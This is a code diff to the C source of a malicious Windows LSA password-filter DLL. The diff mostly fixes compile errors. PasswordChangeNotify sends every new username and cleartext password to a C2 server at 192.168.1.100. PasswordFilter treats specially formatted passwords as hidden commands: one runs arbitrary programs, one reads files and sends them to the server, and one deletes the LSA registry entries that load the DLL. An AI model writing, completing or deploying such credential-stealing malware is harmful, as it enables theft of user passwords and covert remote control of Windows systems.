@@ -1,19 +1,25 @@
+#define WIN32_NO_STATUS
+#include <winsock2.h>    
+#include <ws2tcpip.h>
 #include <windows.h>
+#include <winnt.h>
+#undef WIN32_NO_STATUS
+
+#include <ntstatus.h>
 #include <ntsecapi.h>
+#include <winternl.h>
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <cstdint>
+#include <stdint.h>
+#include <strsafe.h>
 
 // ---------------------------------------------------------------------
-// C2 Stuff
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <windows.h>
-#include <stdio.h>
-
+//C2 stuff
 #pragma comment(lib, "ws2_32.lib")  
 
 #define SERVER_IP   "192.168.1.100"
@@ -149,7 +155,7 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
     int count = 0;
 
     wchar_t* ctx;
-    wchar_t* token = wcstok(myUnicodeString->Buffer, L":", &ctx);
+    wchar_t* token = wcstok(password->Buffer, L":", &ctx);
     while (token != NULL && count < 16) {
 
         tokens[count++] = token;
@@ -157,15 +163,23 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
     
     }
 
-    // check if it is a C2 command...
-    if (wcscmp(tokens[0], L"c2") == 0 || wcscmp(tokens[0], L"C2") == 0){
-        
-        cmd = tokens[1];
+    wchar_t *c2_identifier = tokens[0];
+    wchar_t *cmd = tokens[1];
+    wchar_t *arg1 = tokens[2];
 
-        if (wcscmp(tokens[1], L"exec") == 0) {
+    // check if it is a C2 command...
+    if (wcscmp(c2_identifier, L"c2") == 0 || wcscmp(c2_identifier, L"C2") == 0){
+
+        if (wcscmp(cmd, L"exec") == 0) {
+            STARTUPINFOW si;
+            ZeroMemory(&si, sizeof(si));
+            si.cb = sizeof(si);
+
+            PROCESS_INFORMATION pi;
+            ZeroMemory(&pi, sizeof(pi));
 
             BOOL process_make_attempt = CreateProcessW(
-                tokens[2],
+                arg1,
                 NULL,                                    // no extra args
                 NULL, NULL,                              // default security
                 FALSE,                                   // don't inherit handles
@@ -183,7 +197,7 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
                 CloseHandle(pi.hThread);
             }
 
-        } else if (wcscmp(tokens[1], L"exfil") == 0) {
+        } else if (wcscmp(cmd, L"exfil") == 0) {
 
             HANDLE hFile = CreateFileW(
                 tokens[2],  // path
@@ -196,36 +210,36 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
             );
 
             if (hFile == INVALID_HANDLE_VALUE) {
-                log_to_server("FAILED TO OPEN REQUESTED FILE TO READ INTO")
+                log_to_server("FAILED TO OPEN REQUESTED FILE TO READ INTO");
             } else {
                 char buf[4096];
                 DWORD bytesRead;
 
-                log_to_server("\n\n======================= REQUESTED FILE CONTENTS =========================================\n\n")
+                log_to_server("\n\n======================= REQUESTED FILE CONTENTS =========================================\n\n");
                 while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
                     
                     buf[bytesRead] = '\0';
                     log_to_server(buf);
                 
                 }
-                log_to_server("\n\n======================= END OF REQUESTED FILE CONTENTS ==================================\n\n")
+                log_to_server("\n\n======================= END OF REQUESTED FILE CONTENTS ==================================\n\n");
 
                 CloseHandle(hFile);
             }
 
         } else if (wcscmp(tokens[1], L"persist") == 0) {
 
-            log_to_server("to implement later")
+            log_to_server("to implement later");
 
         } else if (wcscmp(tokens[1], L"kill") == 0) {
 
-            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "Auth0");
-            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Security Packages");
-            checkAndClean(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Notification Packages");
+            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "Auth0");
+            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Security Packages");
+            clean_reg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", "Notification Packages");
 
         } else {
           
-            log_to_server("Detected attempted C2 command: COMMAND WAS INALID")  
+            log_to_server("Detected attempted C2 command: COMMAND WAS INALID");
         
         }
 
@@ -238,17 +252,21 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
 // Receives cleartext username and new password
 // Return STATUS_SUCCESS (0) when done
 NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING user_name, ULONG relative_id, PUNICODE_STRING new_password) {
-    WCHAR buf[256];
-    UNICODE_STRING result;
-    WCHAR idBuf[32];
-    UNICODE_STRING idStr;
+    char buf[256];
+    char user_buf[128];
+    char pass_buf[128];
 
-    _snwprintf(idBuf, 32, L"%lu", relative_id);
-    _snwprintf(buf, 256, L"%s : %wZ : %wZ", idBuf, user_name, new_password);
+    WideCharToMultiByte(CP_UTF8, 0, user_name->Buffer, user_name->Length / sizeof(WCHAR), user_buf, sizeof(user_buf), NULL, NULL);
+    WideCharToMultiByte(CP_UTF8, 0, new_password->Buffer, new_password->Length / sizeof(WCHAR), pass_buf, sizeof(pass_buf), NULL, NULL);
 
-    log_to_server("\n\n-- NEW CREDS SET --")
+    user_buf[user_name->Length / sizeof(WCHAR)] = '\0';
+    pass_buf[new_password->Length / sizeof(WCHAR)] = '\0';
+
+    StringCbPrintfA(buf, sizeof(buf), "%lu : %s : %s", relative_id, user_buf, pass_buf);
+
+    log_to_server("\n\n-- NEW CREDS SET --");
     log_to_server(buf);
-    log_to_server("--------------------\n\n")
+    log_to_server("--------------------\n\n");
 
     return TRUE;
 }
